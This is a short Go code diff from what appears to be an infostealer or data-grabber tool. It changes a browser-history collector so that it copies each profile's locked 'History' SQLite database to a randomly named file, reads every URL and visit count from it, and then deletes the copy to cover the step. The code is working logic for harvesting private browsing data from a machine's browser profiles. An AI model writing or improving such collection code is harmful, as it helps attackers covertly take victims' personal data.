@@ -29,11 +29,14 @@ func Get() string {
 				continue
 			}
 			path = path + "\\" + profile
-			db, err := sql.Open("sqlite3", path+"\\History")
+			copy_path := path + "\\History" + util.RandomName()
+			util.CopyFileKDOT(path+"\\History", copy_path)
+			db, err := sql.Open("sqlite3", copy_path)
 			if err != nil {
 				continue
 			}
 			defer db.Close()
+			defer os.Remove(copy_path)
 
 			row, err := db.Query("SELECT url, visit_count FROM urls")
 			if err != nil {
